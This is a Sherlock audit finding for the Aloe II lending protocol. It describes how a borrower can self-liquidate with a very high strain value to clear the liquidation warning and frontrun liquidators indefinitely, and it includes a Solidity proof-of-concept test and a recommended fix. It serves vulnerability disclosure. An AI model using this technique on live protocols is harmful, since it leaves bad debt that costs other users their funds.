# panprog - It is possible to frontrun liquidations with self liquidation with high strain value to clear warning and keep unhealthy positions from liquidation

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Aloe II
**Keywords:** cybersecurity, vulnerability, liquidation, self-liquidation, frontrunning, asset swaps, warning state, LIQUIDATION_GRACE_PERIOD, malicious user, borrow position, bad debt, protocol users, denial of service, DOS attack, unhealthy positions, liquidators, margin, liquidation timer, protocol function, bank run

---

panprog

high

# It is possible to frontrun liquidations with self liquidation with high strain value to clear warning and keep unhealthy positions from liquidation
## Summary

Account liquidation involving asset swaps requires warning the account first via \u0060warn\u0060. Liquidation can only happen \u0060LIQUIDATION_GRACE_PERIOD\u0060 (2 minutes) after the warning. The problem is that any liquidation clears the warning state, including partial liquidations even with very high strain value. This makes it possible to frontrun any liquidation (or just submit transactions as soon as LIQUIDATION_GRACE_PERIOD expires) by self-liquidating with very high strain amount (which basically keeps position unchanged and still unhealthy). This clears the warning state and allows account to be unliquidatable for 2 more minutes, basically preventing (DOS\u0027ing) liquidators from performing their job.

Malicious user can open a huge borrow position with minimum margin and can keep frontrunning liquidations this way, basically allowing unhealthy position remain active forever. This can easily lead to position going into bad debt and causing loss of funds for the other protocol users (as they will not be able to withdraw all their funds due to account\u0027s bad debt).

## Vulnerability Detail

\u0060Borrower.warn\u0060 sets the time when the liquidation (involving swap) can happen:
\u0060\u0060\u0060solidity
slot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);
\u0060\u0060\u0060

But \u0060Borrower.liquidation\u0060 clears the warning regardless of whether account is healthy or not after the repayment:
\u0060\u0060\u0060solidity
_repay(repayable0, repayable1);
slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;
\u0060\u0060\u0060

## Impact

Very important protocol function (liquidation) can be DOS\u0027ed and make the unhealthy accounts avoid liquidations for a very long time. Malicious users can thus open huge risky positions which will then go into bad debt causing loss of funds for all protocol users as they will not be able to withdraw their funds and can cause a bank run - first users will be able to withdraw, but later users won\u0027t be able to withdraw as protocol won\u0027t have enough funds for this.

## Proof of concept

The scenario above is demonstrated in the test, add this to Liquidator.t.sol:
\u0060\u0060\u0060solidity
function test_liquidationFrontrun() public {
    uint256 margin0 = 1595e18;
    uint256 margin1 = 0;
    uint256 borrows0 = 0;
    uint256 borrows1 = 1e18 * 100;

    // Extra due to rounding up in liabilities
    margin0 += 1;

    deal(address(asset0), address(account), margin0);
    deal(address(asset1), address(account), margin1);

    bytes memory data = abi.encode(Action.BORROW, borrows0, borrows1);
    account.modify(this, data, (1 << 32));

    assertEq(lender0.borrowBalance(address(account)), borrows0);
    assertEq(lender1.borrowBalance(address(account)), borrows1);
    assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);
    assertEq(asset1.balanceOf(address(account)), borrows1 + margin1);

    _setInterest(lender0, 10100);
    _setInterest(lender1, 10100);

    account.warn((1 << 32));

    uint40 unleashLiquidationTime = uint40((account.slot0() >> 208) % (1 << 40));
    assertEq(unleashLiquidationTime, block.timestamp + LIQUIDATION_GRACE_PERIOD);

    skip(LIQUIDATION_GRACE_PERIOD + 1);

    // listen for liquidation, or be the 1st in the block when warning is cleared
    // liquidate with very high strain, basically keeping the position, but clearing the warning
    account.liquidate(this, bytes(""), 1e10, (1 << 32));

    unleashLiquidationTime = uint40((account.slot0() >> 208) % (1 << 40));
    assertEq(unleashLiquidationTime, 0);

    // the liquidation command we\u0027ve frontrun will now revert (due to warning not set: "Aloe: grace")
    vm.expectRevert();
    account.liquidate(this, bytes(""), 1, (1 << 32));
}
\u0060\u0060\u0060

## Code Snippet

\u0060Borrower.warn\u0060 sets the liquidation timer:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L171

\u0060Borrower.liquidate\u0060 clears it regardless of strain:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L281

This makes **any** liquidation (even the one which doesn\u0027t affect assets much due to high strain amount) clear the warning.

## Tool used

Manual Review

## Recommendation

Consider clearing "warn" status only if account is healthy after liquidation.
